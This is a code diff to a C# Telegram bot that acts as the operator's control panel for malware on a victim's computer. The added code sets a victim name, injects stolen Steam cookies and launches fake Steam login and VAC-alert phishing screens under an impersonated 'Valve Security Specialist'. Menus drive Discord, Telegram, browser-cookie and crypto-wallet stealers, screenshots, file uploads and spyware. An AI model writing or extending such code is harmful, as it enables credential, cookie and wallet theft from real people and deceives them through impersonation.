@@ -18,6 +18,7 @@ namespace FinalBot
     {
         private readonly ITelegramBotClient _botClient;
         private readonly string _adminId;
+        private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();
 
         public CommandHandler(ITelegramBotClient botClient, string adminId)
         {
@@ -27,13 +28,21 @@ namespace FinalBot
 
         public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
         {
-            if (update.Type == UpdateType.Message && update.Message != null)
+            try
             {
-                await HandleCommand(update.Message);
+                if (update.Type == UpdateType.Message && update.Message != null)
+                {
+                    await HandleCommand(update.Message);
+                }
+                else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
+                {
+                    await HandleCallbackQuery(update.CallbackQuery);
+                }
             }
-            else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
+            catch (Exception ex)
             {
-                await HandleCallbackQuery(update.CallbackQuery);
+                Console.WriteLine($"[HANDLER ERROR] {ex.Message}");
+                // Ensure bot doesn't crash on one error
             }
         }
 
@@ -48,6 +57,32 @@ namespace FinalBot
             if (message.From?.Id.ToString() != _adminId) return;
 
             string text = message.Text ?? "";
+
+            // Handle State-based responses first
+            if (_userState.TryGetValue(message.Chat.Id, out string state))
+            {
+                if (state == "awaiting_agent_name")
+                {
+                    _phishAgentName = text;
+                    _userState.Remove(message.Chat.Id);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Agent Name set to:</b> <code>{_phishAgentName}</code>", parseMode: ParseMode.Html);
+                    return;
+                }
+                else if (state == "awaiting_phish_cookies")
+                {
+                    _phishCookies = text;
+                    _userState.Remove(message.Chat.Id);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Steam Cookies Injected!</b>", parseMode: ParseMode.Html);
+                    return;
+                }
+                else if (state == "awaiting_victim_name")
+                {
+                    ConfigManager.VictimName = text;
+                    _userState.Remove(message.Chat.Id);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Victim Name set to:</b> <code>{text}</code>", parseMode: ParseMode.Html);
+                    return;
+                }
+            }
             
             if (text.StartsWith("/start") || text.StartsWith("/panel"))
             {
@@ -118,7 +153,7 @@ namespace FinalBot
             {
                 case "admin_panel":
                     await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
-                    await ShowAdminPanel(message.Chat.Id);
+                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
                     break;
                 case "back_to_main":
                     await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
@@ -143,10 +178,8 @@ namespace FinalBot
                     await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                     break;
                 case "set_victim_name":
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ **Please enter the new victim name:**");
-                    // We'd need a simple state machine to capture the next text message as the name.
-                    // For simplicity, we'll assume the user uses a command /setname <name> instead if not implemented here.
-                    // But let's add a simple check in HandleCommand.
+                    _userState[message.Chat.Id] = "awaiting_victim_name";
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter the new Victim Name:</b>", parseMode: ParseMode.Html);
                     break;
                 case "screenshot":
                     await HandleScreenshot(message.Chat.Id);
@@ -167,12 +200,22 @@ namespace FinalBot
                     await HandleFullReport(message.Chat.Id);
                     break;
                 case "phish_steam_login":
-                    PhishManager.LaunchSteamLogin();
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched Steam Login Phish*", parseMode: ParseMode.Markdown);
+                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies);
+                    FinalBot.Modules.PhishManager.LaunchSteamLogin();
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Login Launched!");
                     break;
                 case "phish_steam_alert":
-                    PhishManager.LaunchSteamAlert();
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched Steam VAC Alert Phish*", parseMode: ParseMode.Markdown);
+                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies);
+                    FinalBot.Modules.PhishManager.LaunchSteamAlert();
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Alert Launched!");
+                    break;
+                case "phish_set_agent":
+                    _userState[message.Chat.Id] = "awaiting_agent_name";
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter Agent Name:</b>", parseMode: ParseMode.Html);
+                    break;
+                case "phish_set_cookies":
+                    _userState[message.Chat.Id] = "awaiting_phish_cookies";
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Paste Cookies (JSON/Base64):</b>", parseMode: ParseMode.Html);
                     break;
                 case "discord_remote_start":
                     await ShowDiscordRemoteMenu(message.Chat.Id, message.MessageId);
@@ -210,17 +253,19 @@ namespace FinalBot
                     {
                         var info = new FileInfo(realPath);
                         string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
-                        string caption = $"📄 **FILE INFO**\n" +
+                        string ext = info.Extension.ToUpper().Replace(".", "");
+                        string caption = $"📄 <b>FILE INFORMATION</b>\n" +
                                          $"━━━━━━━━━━━━━━━━━━\n" +
-                                         $"📂 **Name:** `{info.Name}`\n" +
-                                         $"⚖️ **Size:** `{size}`\n" +
-                                         $"📅 **Created:** `{info.CreationTime:yyyy-MM-dd HH:mm}`\n" +
-                                         $"📝 **Modified:** `{info.LastWriteTime:yyyy-MM-dd HH:mm}`\n" +
+                                         $"📂 <b>Name:</b> <code>{info.Name}</code>\n" +
+                                         $"🏗️ <b>Format:</b> <code>{ext}</code>\n" +
+                                         $"⚖️ <b>Size:</b> <code>{size}</code>\n" +
+                                         $"📅 <b>Created:</b> <code>{info.CreationTime:yyyy-MM-dd HH:mm}</code>\n" +
+                                         $"📝 <b>Modified:</b> <code>{info.LastWriteTime:yyyy-MM-dd HH:mm}</code>\n" +
                                          $"━━━━━━━━━━━━━━━━━━";
 
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ *Uploading:* `{info.Name}`...", parseMode: ParseMode.Markdown);
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>Uploading:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
                         using var stream = System.IO.File.OpenRead(realPath);
-                        await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Markdown);
+                        await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
                     }
                     }
                     else if (data.StartsWith("fmp_"))
@@ -271,18 +316,18 @@ namespace FinalBot
 
         private async Task HandleDiscordSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "💬 *Scanning Discord...*");
+            await _botClient.SendTextMessageAsync(chatId, "💬 <i>Scanning Discord...</i>", parseMode: ParseMode.Html);
             var stealer = new DiscordStealer();
             string report = await stealer.Run();
-            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Markdown);
+            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
         }
 
         private async Task HandleBrowserSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "🌍 *Scanning Browsers...*");
+            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>Scanning Browsers...</i>", parseMode: ParseMode.Html);
             var stealer = new BrowserStealer();
             string report = await stealer.RunAll();
-            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Markdown);
+            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
         }
 
         private async Task HandleTelegramSteal(long chatId)
@@ -406,17 +451,17 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🎮 Discord Data", "work_discord"),
-                    InlineKeyboardButton.WithCallbackData("✈️ Telegram Data", "work_telegram")
+                    InlineKeyboardButton.WithCallbackData("🎮 Discord", "work_discord"),
+                    InlineKeyboardButton.WithCallbackData("✈️ Telegram", "work_telegram")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🌐 Browser Data", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("💰 Wallets", "work_crypto")
+                    InlineKeyboardButton.WithCallbackData("🍪 Cookies", "work_browsers"),
+                    InlineKeyboardButton.WithCallbackData("💰 Crypto", "work_crypto")
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🎭 Phishing Menu", "panel_phishing")
+                    InlineKeyboardButton.WithCallbackData("🎭 Phishing", "panel_phishing")
                 },
                 new[]
                 {
@@ -424,7 +469,50 @@ namespace FinalBot
                 }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "💼 **WORK PANEL**\nSelect a stealer or phishing module:", parseMode: ParseMode.Markdown, replyMarkup: markup);
+            string info = "💼 <b>WORK PANEL</b>\n" +
+                          "━━━━━━━━━━━━━━━━━━\n" +
+                          "🛡️ <b>Stealers:</b> Discord, Telegram, Browsers, Wallets\n" +
+                          "🎭 <b>Phishing:</b> Steam Alerts, Fake Logins\n" +
+                          "━━━━━━━━━━━━━━━━━━\n" +
+                          "Select a module to continue:";
+
+            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
+        }
+
+        private string _phishAgentName = "Valve_Security_Specialist_732";
+        private string _phishCookies = "";
+
+        private async Task ShowPhishingPanel(long chatId, int messageId)
+        {
+            var markup = new InlineKeyboardMarkup(new[]
+            {
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("📢 Steam Alert", "phish_steam_alert"),
+                    InlineKeyboardButton.WithCallbackData("🔑 Steam Login", "phish_steam_login")
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("👤 Set Agent", "phish_set_agent"),
+                    InlineKeyboardButton.WithCallbackData("🍪 Inject Cookies", "phish_set_cookies")
+                },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🔙 Back", "panel_work")
+                }
+            });
+
+            string statusText = string.IsNullOrEmpty(_phishCookies) ? "❌ Not Set" : "✅ Loaded";
+            string info = "🎭 <b>PHISHING CENTER</b>\n" +
+                          "━━━━━━━━━━━━━━━━━━\n" +
+                          $"🕵️ <b>Agent:</b> <code>{_phishAgentName}</code>\n" +
+                          $"🍪 <b>Cookies:</b> {statusText}\n" +
+                          "━━━━━━━━━━━━━━━━━━\n" +
+                          "1️⃣ <b>Set Agent:</b> Change the name displayed in the alert.\n" +
+                          "2️⃣ <b>Inject Cookies:</b> Paste base64 or JSON cookies.\n" +
+                          "3️⃣ <b>Launch:</b> Start the phishing process on victim PC.";
+
+            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
         }
 
         private async Task ShowSpywarePanel(long chatId, int messageId)
